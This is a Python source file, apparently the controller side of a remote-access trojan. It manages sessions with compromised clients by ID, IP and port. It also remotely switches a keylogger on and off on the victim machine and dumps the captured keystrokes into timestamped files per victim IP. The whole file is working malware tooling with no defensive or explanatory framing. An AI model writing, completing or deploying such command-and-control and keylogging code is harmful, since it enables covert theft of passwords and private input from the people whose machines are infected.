
import subprocess
from datetime import datetime

from common.output import *


class COMMCENTER:
    CLIENTS = []
    COUNTER = 0
    CURRENT = ()
    KEYLOGS = []

    def c_help(self, vals):
        if len(vals) > 1:
            if vals[1] == "sessions":
                help_c_sessions()
            elif vals[1] == "connect":
                help_c_connect()
            elif vals[1] == "disconnect":
                help_c_disconnect()
            elif vals[1] == "keylogger":
                help_c_keylogger()
        else:
            if self.CURRENT:
                help_c_current()
            else:
                help_c_general()

    def get_valid(self, _id):
        for client in self.CLIENTS:
            if client[0] == int(_id):
                return client

        return False

    def c_ping(self, _id):
        return

    def c_connect(self, args):
        if len(args) == 2:
            tgt = self.get_valid(args[1])
            if tgt:
                self.CURRENT = tgt
            else:
                sys.stdout.write("\n")
                print_red("No client is associated with that ID!")
                sys.stdout.write("\n")
        else:
            sys.stdout.write("\n")
            print_red("Invalid Syntax!")
            sys.stdout.write("\n")

    def c_disconnect(self):
        self.CURRENT = ()

    def c_sessions(self):
        headers = (
            BOLD + 'ID' + END, BOLD + 'IP Address' + END, BOLD + 'Incoming Port' + END,
            BOLD + 'Status' + END)
        lister = []

        for client in self.CLIENTS:
            toappend = []
            toappend.append(RED + str(client[0]) + END)
            toappend.append(DARKCYAN + client[1].ip + END)
            toappend.append(BLUE + str(client[1].port) + END)
            toappend.append(GREEN + client[1].STATUS + END)
            lister.append(toappend)

        sys.stdout.write("\n")
        print(tabulate.tabulate(lister, headers=headers))
        sys.stdout.write("\n")

    def c_clear(self):
        subprocess.call(["clear"], shell=True)

    def c_keylogger(self, args):
        if self.CURRENT:
            if len(args) == 2:
                if args[1] == "status":
                    return
                elif args[1] == "on":
                    self.CURRENT[1].send_data("keylogger:on")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result)

                elif args[1] == "off":
                    self.CURRENT[1].send_data("keylogger:off")
                    result = self.CURRENT[1].recv_data()
                    if result.strip(" "):
                        print(result)

                elif args[1] == "dump":
                    self.CURRENT[1].send_data("keylogger:dump")
                    result = self.CURRENT[1].recv_data()
                    dirname = os.path.dirname(__file__)
                    dirname = os.path.join(dirname, 'keylogs')
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    dirname = os.path.join(dirname, '%s' % (self.CURRENT[1].ip))
                    if not os.path.isdir(dirname):
                        os.mkdir(dirname)
                    fullpath = os.path.join(dirname, datetime.now().strftime("%d-%m-%Y %H:%M:%S.txt"))
                    fl = open(fullpath, 'w')
                    fl.write(result)
                    fl.close()
                    print_green("Dumped: [" + GREEN + fullpath + END + "]")

                else:
                    print_red("Invalid Syntax!")
            else:
                print_red("Invalid Syntax!")
        else:
            print_red("You need to connect before execute this command!")

    def c_exit(self):
        sys.stdout.write("\n")
        print_red("See Ya!\n")
